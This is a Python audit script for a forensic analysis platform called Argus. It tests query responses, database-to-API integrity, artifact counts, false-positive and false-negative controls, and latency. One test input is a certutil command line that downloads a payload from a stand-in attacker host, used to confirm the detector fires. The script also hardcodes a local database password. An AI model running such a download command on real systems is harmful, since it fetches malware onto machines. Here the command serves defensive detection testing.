import os
import sys
import time
import json
import hashlib
import psycopg2
from psycopg2.extras import RealDictCursor
from pathlib import Path
from datetime import datetime, timezone

sys.path.insert(0, os.path.abspath(r"c:\Users\Sudeep\Downloads\Argus\Argus"))
sys.path.insert(0, os.path.abspath(r"c:\Users\Sudeep\Downloads\Argus\Argus\frontend"))

from fastapi.testclient import TestClient
from api.main import app
import api_client

from preprocessing.router import ParserRouter
from preprocessing.artifact_extractor.extractor import ArtifactExtractor
from preprocessing.fcr_engine.engine import FCREngine
from forensic_analysis.orchestrator import process_fcr_batch
from forensic_analysis.schemas import Finding, finding_to_fir
from fir.repository import FIRRepository
from sanitization.gateway import SanitizationGateway
from infrastructure.schemas import Evidence
from preprocessing.schemas import Artifact, NormalizedFields

client = TestClient(app)
case_id = "CASE-FINAL-DEMO-2026"
tenant_id = "default"
headers = {"X-Tenant-ID": tenant_id}

results = {}

print("======================================================================")
print("STARTING ARGUS COMPREHENSIVE DEEP ACCURACY AUDIT")
print("======================================================================")

# --------------------------------------------------------------------
# FOCUS AREA 1: ANALYST QUERY AUDIT & ORIGIN TRACE
# --------------------------------------------------------------------
print("\n[FOCUS AREA 1] ANALYST QUERY AUDIT & ORIGIN TRACE")

q_a = "Which findings in this case involve PowerShell, and what evidence supports them?"
q_b = "What are the highest-confidence findings in this case?"

t0 = time.perf_counter()
res_a = client.post(f"/cases/{case_id}/query", json={"query": q_a}, headers=headers).json()
t_q_a = time.perf_counter() - t0

t0 = time.perf_counter()
res_b = client.post(f"/cases/{case_id}/query", json={"query": q_b}, headers=headers).json()
t_q_b = time.perf_counter() - t0

print("Query A Response:", json.dumps(res_a, indent=2))
print("Query B Response:", json.dumps(res_b, indent=2))

results["focus_1"] = {
    "query_a": q_a,
    "response_a": res_a,
    "time_a_sec": round(t_q_a, 4),
    "query_b": q_b,
    "response_b": res_b,
    "time_b_sec": round(t_q_b, 4),
    "same_response": res_a["response"] == res_b["response"],
    "contains_f1001": "F-1001" in str(res_a["response"])
}

# --------------------------------------------------------------------
# FOCUS AREA 2: POSTGRESQL -> API -> FRONTEND INTEGRITY (5 FINDINGS)
# --------------------------------------------------------------------
print("\n[FOCUS AREA 2] POSTGRESQL -> API -> FRONTEND INTEGRITY")

conn = psycopg2.connect(host="localhost", port=5433, dbname="argus", user="argus_user", password="argus_dev")
cur = conn.cursor(cursor_factory=RealDictCursor)

cur.execute("""
    SELECT finding_id, finding_fingerprint, case_id, tenant_id, severity, confidence, sanitized_fact, source_artifact_id, review_status, layer
    FROM fir_findings
    WHERE case_id = %s
    LIMIT 5;
""", (case_id,))
pg_findings = cur.fetchall()

# Call API GET /reports/{case_id}/report?format=json
api_report = client.get(f"/reports/{case_id}/report?format=json&allow_unreviewed=true", headers=headers).json()
api_findings_map = {f["finding_id"]: f for f in api_report["findings"]}

integrity_mismatches = []
for pg_f in pg_findings:
    fid = pg_f["finding_id"]
    api_f = api_findings_map.get(fid)
    if not api_f:
        integrity_mismatches.append(f"Finding ID {fid} missing from API response!")
        continue
    
    fields_to_check = ["finding_id", "case_id", "tenant_id", "severity", "confidence", "sanitized_fact", "source_artifact_id", "review_status", "layer"]
    for field in fields_to_check:
        pg_val = pg_f[field]
        if field == "review_status" and hasattr(pg_val, "value"):
            pg_val = pg_val.value
        api_val = api_f.get(field)
        if str(pg_val) != str(api_val):
            integrity_mismatches.append(f"Mismatch in {field} for {fid}: PG='{pg_val}' vs API='{api_val}'")

print(f"Verified 5 PostgreSQL findings against API response. Mismatches found: {len(integrity_mismatches)}")
for m in integrity_mismatches:
    print("  [MISMATCH]", m)

results["focus_2"] = {
    "verified_count": len(pg_findings),
    "mismatches_count": len(integrity_mismatches),
    "mismatches": integrity_mismatches,
    "sample_pg_findings": pg_findings
}

# --------------------------------------------------------------------
# FOCUS AREA 3: SOURCE ARTIFACT COUNT DISCREPANCY
# --------------------------------------------------------------------
print("\n[FOCUS AREA 3] SOURCE ARTIFACT COUNT DISCREPANCY")
cur.execute("SELECT COUNT(DISTINCT source_artifact_id) as cnt FROM fir_findings WHERE case_id = %s;", (case_id,))
sql_distinct_artifacts = cur.fetchone()["cnt"]

case_sum = client.get(f"/cases/{case_id}", headers=headers).json()
api_artifact_count = case_sum.get("source_artifact_count")

print(f"SQL Distinct source_artifact_id Count: {sql_distinct_artifacts}")
print(f"API Summary source_artifact_count   : {api_artifact_count}")

results["focus_3"] = {
    "sql_distinct_artifacts": sql_distinct_artifacts,
    "api_artifact_count": api_artifact_count,
    "matches": sql_distinct_artifacts == api_artifact_count
}

# --------------------------------------------------------------------
# FOCUS AREA 5: FALSE POSITIVE NEGATIVE CONTROL TEST
# --------------------------------------------------------------------
print("\n[FOCUS AREA 5] FALSE POSITIVE NEGATIVE CONTROL TEST")

fcr_engine = FCREngine()
novel_art_a = Artifact(
    artifact_id="art-novel-host-a",
    case_id="CASE-NOVEL-FP-TEST",
    evidence_id="EV-NOVEL-A",
    source_tool="test_tool",
    artifact_type="process_event",
    host_id="HOST-ALPHA-99",
    timestamp=datetime.now(timezone.utc),
    normalized_fields=NormalizedFields(host="HOST-ALPHA-99", user="bob_novel", process_name="unique_app1.exe", process_id=9001)
)
novel_art_b = Artifact(
    artifact_id="art-novel-host-b",
    case_id="CASE-NOVEL-FP-TEST",
    evidence_id="EV-NOVEL-B",
    source_tool="test_tool",
    artifact_type="network_connection",
    host_id="HOST-BETA-88",
    timestamp=datetime.now(timezone.utc),
    normalized_fields=NormalizedFields(host="HOST-BETA-88", user="alice_novel", dst_ip="203.0.113.199", dst_port=8443)
)

fp_fcrs = fcr_engine.correlate([novel_art_a, novel_art_b])
print(f"FCR Correlation Records generated for unrelated novel evidence: {len(fp_fcrs)} (Expected: 0)")

results["focus_5"] = {
    "unrelated_artifacts_count": 2,
    "fcrs_generated": len(fp_fcrs),
    "passed": len(fp_fcrs) == 0
}

# --------------------------------------------------------------------
# FOCUS AREA 6: FALSE NEGATIVE POSITIVE CONTROL TEST
# --------------------------------------------------------------------
print("\n[FOCUS AREA 6] FALSE NEGATIVE POSITIVE CONTROL TEST")

from forensic_analysis.log_analysis.process_creation_analyzer import ProcessCreationAnalyzer
proc_analyzer = ProcessCreationAnalyzer()

fn_artifact = Artifact(
    artifact_id="art-fn-test-01",
    case_id="CASE-FN-TEST",
    evidence_id="EV-FN-TEST",
    source_tool="sysmon",
    artifact_type="process_event",
    host_id="VICTIM-HOST-01",
    timestamp=datetime.now(timezone.utc),
    normalized_fields=NormalizedFields(
        host="VICTIM-HOST-01",
        process_name="certutil.exe",
        parent_process_name="cmd.exe",
        process_command_line="certutil.exe -urlcache -f http://evil-domain.com/payload.exe payload.exe"
    )
)

fn_findings = proc_analyzer.analyze("CASE-FN-TEST", [fn_artifact], fcr_ref="CORR-FN-TEST-01")
print(f"Findings detected for certutil.exe LOLBin payload: {len(fn_findings)}")
if fn_findings:
    print(f"  Detected Fact: {fn_findings[0].fact}")
    print(f"  Severity: {fn_findings[0].severity} | MITRE: {fn_findings[0].mitre_mapping}")

results["focus_6"] = {
    "input_evidence": "certutil.exe -urlcache -f http://evil-domain.com/payload.exe payload.exe",
    "expected_finding": "LOLBin execution detected (certutil.exe)",
    "findings_detected_count": len(fn_findings),
    "rule_responsible": "ProcessCreationAnalyzer (LOLBAS snapshot rule)",
    "passed": len(fn_findings) > 0 and fn_findings[0].severity == "high"
}

# --------------------------------------------------------------------
# FOCUS AREA 9: PERFORMANCE LATENCY BENCHMARKING
# --------------------------------------------------------------------
print("\n[FOCUS AREA 9] LATENCY BENCHMARKING")

latencies = {}

# A. Frontend Case Summary API call
t0 = time.perf_counter()
api_client.get_case_summary(case_id, tenant_id)
latencies["frontend_case_loading_sec"] = round(time.perf_counter() - t0, 4)

# B. Evidence upload API call
sample_file = Path("scratch/multi_evidence/phishing_sample.eml")
file_bytes = sample_file.read_bytes()
t0 = time.perf_counter()
api_client.upload_evidence(file_bytes, sample_file.name, "CASE-PERF-TEST", tenant_id)
latencies["evidence_upload_sec"] = round(time.perf_counter() - t0, 4)

# C. PostgreSQL query latency
t0 = time.perf_counter()
cur.execute("SELECT * FROM fir_findings WHERE case_id = %s;", (case_id,))
cur.fetchall()
latencies["postgres_query_sec"] = round(time.perf_counter() - t0, 4)

# D. API JSON Report generation
t0 = time.perf_counter()
client.get(f"/reports/{case_id}/report?format=json&allow_unreviewed=true", headers=headers)
latencies["api_json_report_sec"] = round(time.perf_counter() - t0, 4)

# E. API HTML Report generation
t0 = time.perf_counter()
client.get(f"/reports/{case_id}/report?format=html&allow_unreviewed=true", headers=headers)
latencies["api_html_report_sec"] = round(time.perf_counter() - t0, 4)

# F. Analyst Query API call
t0 = time.perf_counter()
client.post(f"/cases/{case_id}/query", json={"query": "Summarize powershell activity"}, headers=headers)
latencies["analyst_query_api_sec"] = round(time.perf_counter() - t0, 4)

for k, v in latencies.items():
    print(f"  {k:<30}: {v} sec")

results["focus_9"] = latencies

conn.close()

# Write JSON results to scratch file
with open("scratch/audit_results_summary.json", "w", encoding="utf-8") as f:
    json.dump(results, f, indent=2)

print("\nDeep accuracy audit script completed successfully!")
